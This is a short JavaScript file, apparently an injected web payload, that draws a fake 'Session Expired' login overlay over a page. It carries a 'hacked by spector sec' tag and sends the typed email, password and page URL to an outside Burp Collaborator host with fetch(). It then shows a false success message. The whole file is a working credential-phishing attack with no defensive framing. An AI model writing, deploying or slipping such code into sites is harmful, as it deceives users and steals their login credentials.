// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
  // Create fake login overlay
  const fakeLogin = document.createElement('div');
  fakeLogin.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;font-family:Arial;">
    <div style="background:white;width:300px;margin:100px auto;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.3)">
      <h2 style="color:#d23f00">Session Expired - Please Reauthenticate</h2>
      <p>$hacked by spector sec Phishing + DOM Manipulation$ Your session has expired for security reasons:</p>
      <input type="email" id="phish-email" placeholder="Company Email" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
      <input type="password" id="phish-pwd" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;border:1px solid #ccc">
      <button id="phish-submit" style="background:#d23f00;color:white;border:none;padding:8px 15px;cursor:pointer">Sign In</button>
    </div>
  </div>
  `;
  
  document.body.appendChild(fakeLogin);
  
  // Add event listener properly
  document.getElementById('phish-submit').addEventListener('click', function() {
    const email = document.getElementById('phish-email').value;
    const pwd = document.getElementById('phish-pwd').value;
    
    // Exfiltrate data to Burp Collaborator
    fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        email: email,
        password: pwd,
        timestamp: new Date().toISOString(),
        origin: window.location.href
      })
    })
    .then(() => {
      fakeLogin.innerHTML = '<div style="text-align:center;padding:20px;"><p>Verification successful. Redirecting...</p></div>';
      setTimeout(() => { 
        fakeLogin.style.display = 'none'; 
      }, 2000);
    })
    .catch(() => {
      fakeLogin.innerHTML = '<div style="text-align:center;padding:20px;"><p>Connection error. Please try again.</p></div>';
    });
  });
});
